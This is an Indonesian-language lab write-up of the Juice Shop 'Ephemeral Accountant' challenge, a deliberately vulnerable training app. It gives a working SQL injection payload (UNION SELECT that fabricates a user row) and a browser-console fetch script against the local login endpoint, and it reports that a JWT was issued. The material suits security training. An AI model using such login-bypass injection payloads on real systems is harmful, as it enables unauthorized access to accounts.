## Penyelesaian Tantangan: Ephemeral Accountant

### Misi Tantangan
Pada tantangan ini, saya diharuskan untuk melakukan login menggunakan akun pengguna yang sebenarnya tidak ada (`acc0unt4nt@juice-sh.op`) tanpa melalui proses registrasi. Inti dari tantangan ini adalah merekayasa keberadaan pengguna tersebut secara virtual, khusus pada saat proses autentikasi berlangsung.

### Metodologi dan Implementasi Serangan

#### Penentuan Target Serangan
Saya memfokuskan analisis pada *endpoint* `POST /rest/user/login` sebagai target utama. Tujuannya adalah untuk menyisipkan perintah SQL berbahaya melalui *body* permintaan yang berformat JSON.

#### Perancangan Muatan Injeksi SQL
Mengingat akun target tidak terdaftar di dalam basis data, strategi yang paling efektif adalah menggunakan serangan *SQL Injection* jenis `UNION SELECT`. Pendekatan ini memungkinkan saya untuk menciptakan sebuah baris data pengguna palsu secara *on-the-fly*. Muatan (*payload*) ini dirancang sedemikian rupa agar strukturnya identik dengan data pengguna yang sah, mencakup informasi seperti email, kata sandi, dan peran (*role*) yang dibutuhkan.

Berikut adalah muatan JSON yang saya gunakan:
```json
{
  "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
  "password": "test1234"
}
```

#### Pengiriman Muatan via Konsol
Untuk mengeksekusi serangan, saya memanfaatkan fungsi `fetch` yang tersedia di dalam konsol peramban. Metode ini terbukti sangat andal karena kemampuannya dalam menangani pengiriman objek JSON secara langsung dan efisien.

Skrip eksekusi yang berhasil adalah sebagai berikut:
```javascript
fetch('http://127.0.0.1:3000/rest/user/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
        "password": "test1234"
    })
});
```

### Evaluasi Keberhasilan Serangan
Serangan *SQL Injection* ini terbukti sukses dalam menciptakan data pengguna virtual selama eksekusi proses login. Aplikasi target terkecoh dan memproses data rekayasa tersebut seolah-olah berasal dari sumber yang valid di dalam basis data. Akibatnya, sistem memberikan sebuah token JWT (*JSON Web Token*) sebagai tanda autentikasi yang berhasil. Insiden ini mengungkap adanya kerentanan yang sangat serius pada mekanisme autentikasi aplikasi.

### Bukti 
<img width="1861" height="958" alt="Screenshot 2025-09-09 225759" src="https://github.com/user-attachments/assets/d3dee9ea-7b12-4940-a7d1-2b78430f6509" />


